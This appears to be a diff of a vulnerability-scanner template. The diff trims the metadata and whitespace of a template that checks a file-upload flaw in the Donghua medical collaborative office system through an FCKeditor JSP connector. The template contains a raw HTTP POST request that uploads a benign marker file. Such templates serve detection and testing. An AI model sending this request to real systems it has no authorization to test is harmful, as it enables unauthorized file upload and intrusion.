@@ -3,12 +3,8 @@ info:
   name: 东华医疗协同办公系统 文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/oehlq98agkggw9p4'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: oehlq98agkggw9p4
-    fofa: body="/skin/charmBlue/css/dialog.css"
 http:
 - raw:
   - 'POST /common/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&Type=&CurrentFolder=/ HTTP/1.1
@@ -38,8 +34,6 @@ http:
     Connection: close
 
 
-
-
     ------WebKitFormBoundaryt1qdEWTI01cj5BLV
 
 
@@ -49,8 +43,6 @@ http:
     Content-Type: image/jpeg
 
 
-
-
     dudesuite
 
 
@@ -58,8 +50,6 @@ http:
 
 
     Content-Disposition: form-data; name="Submit"
-
-
 
 
     upload
